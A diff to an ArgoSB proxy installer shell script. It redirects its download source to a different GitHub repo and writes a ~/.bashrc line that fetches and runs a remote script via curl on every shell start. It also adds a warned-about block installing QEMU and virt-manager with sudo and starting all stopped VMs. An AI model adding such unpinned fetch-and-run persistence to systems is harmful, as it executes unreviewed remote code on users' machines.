@@ -299,11 +299,11 @@ fi
 if find /proc/*/exe -type l 2>/dev/null | grep -E '/proc/[0-9]+/exe' | xargs -r readlink 2>/dev/null | grep -q 'agsb/s' || pgrep -f 'agsb/s' >/dev/null 2>&1 ; then
 [ -f ~/.bashrc ] || touch ~/.bashrc
 sed -i '/yonggekkk/d' ~/.bashrc
-echo "if ! find /proc/*/exe -type l 2>/dev/null | grep -E '/proc/[0-9]+/exe' | xargs -r readlink 2>/dev/null | grep -q 'agsb/s' && ! pgrep -f 'agsb/s' >/dev/null 2>&1; then export ip=\"${ipsw}\" argo=\"${argo}\" uuid=\"${uuid}\" $vlp=\"${port_vl_re}\" $vmp=\"${port_vm_ws}\" $hyp=\"${port_hy2}\" $tup=\"${port_tu}\" reym=\"${ym_vl_re}\" agn=\"${ARGO_DOMAIN}\" agk=\"${ARGO_AUTH}\"; bash <(curl -Ls https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh); fi" >> ~/.bashrc
+echo "if ! find /proc/*/exe -type l 2>/dev/null | grep -E '/proc/[0-9]+/exe' | xargs -r readlink 2>/dev/null | grep -q 'agsb/s' && ! pgrep -f 'agsb/s' >/dev/null 2>&1; then export ip=\"${ipsw}\" argo=\"${argo}\" uuid=\"${uuid}\" $vlp=\"${port_vl_re}\" $vmp=\"${port_vm_ws}\" $hyp=\"${port_hy2}\" $tup=\"${port_tu}\" reym=\"${ym_vl_re}\" agn=\"${ARGO_DOMAIN}\" agk=\"${ARGO_AUTH}\"; bash <(curl -Ls https://raw.githubusercontent.com/wx2two/wang/main/argosb.sh); fi" >> ~/.bashrc
 COMMAND="agsb"
 SCRIPT_PATH="$HOME/bin/$COMMAND"
 mkdir -p "$HOME/bin"
-curl -Ls https://raw.githubusercontent.com/yonggekkk/argosb/main/argosb.sh > "$SCRIPT_PATH"
+curl -Ls https://raw.githubusercontent.com/wx2two/wang/main/argosb.sh > "$SCRIPT_PATH"
 chmod +x "$SCRIPT_PATH"
 sed -i '/export PATH="\$HOME\/bin:\$PATH"/d' ~/.bashrc
 echo 'export PATH="$HOME/bin:$PATH"' >> "$HOME/.bashrc"
@@ -323,6 +323,47 @@ fi
 crontab /tmp/crontab.tmp 2>/dev/null
 rm /tmp/crontab.tmp
 echo "ArgoSB脚本进程启动成功，安装完毕" && sleep 2
+
+####################################################################################
+#
+#                              !!! 警告 - WARNING !!!
+#
+# 下方的代码是根据您的特定要求添加的。
+# 在您当前的云环境 (firebase-ee1...) 中运行这些命令的风险极高！
+#
+# 1. 极有可能导致您的环境【崩溃、无法连接】。
+# 2. 即使安装成功，所有软件也会在【重启后被完全清除】，因为您的系统是非持久化的。
+# 3. 这个操作与本脚本原有功能无关，且不被推荐。
+#
+#                              请自行承担风险
+#
+####################################################################################
+
+echo "--- [警告] 即将开始执行您要求的虚拟机软件安装流程 ---"
+
+echo "步骤 1/5: 更新软件包列表..."
+sudo apt update
+
+echo "步骤 2/5: 安装 QEMU (虚拟机核心)..."
+sudo apt install qemu-system -y
+
+echo "步骤 3/5: 安装 Virt-Manager (虚拟机管理器)..."
+sudo apt install virt-manager -y
+
+echo "--- 所有软件已尝试安装完毕 ---"
+
+echo "步骤 4/5: 等待 5 秒，然后尝试启动 Virt-Manager..."
+sleep 5
+# virt-manager 是一个图形界面程序，在没有桌面的服务器上运行它通常会报错。
+# 我们在后台运行它，并把所有输出重定向，以避免脚本卡住。
+virt-manager > /dev/null 2>&1 &
+
+echo "步骤 5/5: 再等待 20 秒，然后尝试启动所有已关闭的虚拟机..."
+sleep 20
+virsh list --all --state-shutoff --name | xargs -I {} bash -c "echo '正在启动: {}'; virsh start '{}'"
+
+echo "--- [警告] 您要求的所有操作已执行完毕。请注意，系统可能已不稳定。---"
+
 else
 echo "ArgoSB脚本进程未启动，安装失败" && exit
 fi
